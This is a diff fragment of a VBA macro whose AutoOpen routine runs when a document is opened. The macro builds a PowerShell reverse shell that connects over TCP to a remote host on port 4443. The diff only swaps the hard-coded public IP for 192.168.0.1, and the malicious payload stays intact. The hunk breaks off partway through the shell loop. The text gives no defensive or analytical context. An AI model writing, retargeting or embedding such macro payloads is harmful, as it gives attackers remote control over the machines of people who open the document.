@@ -5,7 +5,7 @@ Sub AutoOpen()
     Dim cmd As String
     
     ' Define your PowerShell script
-    psScript = "Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('152.67.5.89',4443));" & vbCrLf & _
+    psScript = "Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.0.1',4443));" & vbCrLf & _
                "Set-Variable -Name stream -Value ($client.GetStream());" & vbCrLf & _
                "[byte[]]$bytes = 0..65535|%{0};" & vbCrLf & _
                "while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0) {" & vbCrLf & _
